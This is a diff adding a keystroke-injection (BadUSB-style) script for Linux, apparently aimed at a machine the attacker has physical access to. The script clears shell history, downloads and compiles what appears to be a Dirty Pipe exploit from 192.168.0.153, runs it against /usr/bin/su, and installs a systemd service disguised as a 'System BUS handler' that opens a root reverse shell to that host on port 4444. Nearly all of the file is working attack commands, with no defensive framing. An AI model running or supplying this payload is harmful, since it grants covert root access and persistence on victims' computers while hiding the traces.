@@ -1,0 +1,45 @@
+DELAY 500
+
+REM |===== Run Terminal ====|
+CTRL ALT T
+DELAY 1000
+STRING unset HISTFILE && HISTSIZE=0 && rm -f $HISTFILE && unset HISTFILE
+ENTER
+DELAY 100
+
+
+REM |==== Downlaod the Payload ====|
+STRING cd /tmp
+ENTER
+STRING wget http://192.168.0.153/files/dirty.c
+ENTER
+DELAY 500
+
+REM |==== Execute Dirty PIP ====|
+STRING gcc dirty.c -o a.out
+ENTER
+DELAY 50
+STRING ./a.out /usr/bin/su
+ENTER
+DELAY 300
+
+REM |=== Add Payload to systemd service ====|
+STRING echo -e "[Unit]\nDescription= System BUS handler\n\n[Service]\nExecStart=/bin/bash  -c 'bash -i >& /dev/tcp/192.168.0.153/4444 0>&1'\nUser=root\nRestart=on-failure\nSuccessExitStatus=3 4\nRestartForceExitStatus=3 4\n\n[Install]\nWantedBy=default.target" > uwe.service
+ENTER
+DELAY 500
+
+
+REM |==== Enable Service ====|
+STRING systemctl daemon-reload
+ENTER
+DELAY 50
+STRING systemctl enable /tmp/uwe.service
+ENTER
+DELAY 50
+STRING systemctl start uwe.service
+ENTER
+DELAY 100
+
+REM  |=== Exit Terminal ====|
+STRING Exit
+Enter
